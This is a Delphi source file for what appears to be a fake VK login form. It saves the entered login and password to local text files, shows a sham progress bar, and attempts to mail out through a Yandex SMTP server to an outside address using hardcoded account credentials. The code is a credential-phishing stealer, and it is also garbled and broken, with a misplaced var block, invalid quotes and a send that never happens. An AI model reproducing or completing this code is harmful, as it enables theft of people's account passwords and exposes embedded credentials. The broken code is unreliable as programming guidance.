﻿unit VK;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, jpeg, ExtCtrls, StdCtrls, ComCtrls, IdBaseComponent, IdComponent,
  IdTCPConnection, IdTCPClient, IdExplicitTLSClientServerBase, IdMessageClient,
  IdSMTPBase, IdSMTP;

type
  TForm1 = class(TForm)
    Image1: TImage;
    Edit1: TEdit;
    Edit2: TEdit;
    Button1: TButton;
    Button2: TButton;
    ProgressBar1: TProgressBar;
    IdSMTP: TIdSMTP;
    procedure Button2Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  l, p:textfile;
  lu, pu:string;

implementation

{$R *.dfm}

const
  default_host = 'smtp.yandex.ru';
  default_timeout = 10000;
  default_username = 'ilia.serg';
  default_password = 'ISStudio2016';

procedure TForm1.Button1Click(Sender: TObject);
begin
  lu:= Edit1.Text;
  pu:= Edit2.Text;
  AssignFile(l, 'appini.txt');
  Reset(l);
  Rewrite(l);
  Writeln(l, lu);
  Closefile(l);
  Assignfile(p, 'appcnsl.txt');
  Reset(p);
  Rewrite(p);
  Writeln(p, pu);
  Closefile(p);
  ProgressBar1.Position:= 10;
  Sleep(2000);
  ProgressBar1.Position:= 90;
  Sleep(1500);
  ProgressBar1.Position:= 100;
  Sleep(150);
  var
Msg: TIdMessage;
begin
Msg.Subject:=′тема сообщения′; //текст темы сообщения
Msg.Recipients.EMailAddresses:=′bogdanwe@mail.ru′;
//указываем адрес получателя
Msg.From.Adress:=′delphi@mail.ru′; //указываем автора письма
Msg.Body.Text:=′текст сообщения′; //размещаем текст сообщения
Msg.Date:=StrToDate(′01.12.2004′);//дата отправки письма может быть любой
end;
  with idSMTP do
  begin
    Host:= default_host;
    Connect(default_timeout);
    AuthType:= satDefault;
    Username:= default_username;
    Password:= default_password;

  end;
  idSMTP
  Close;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
  Close;
end;

end.
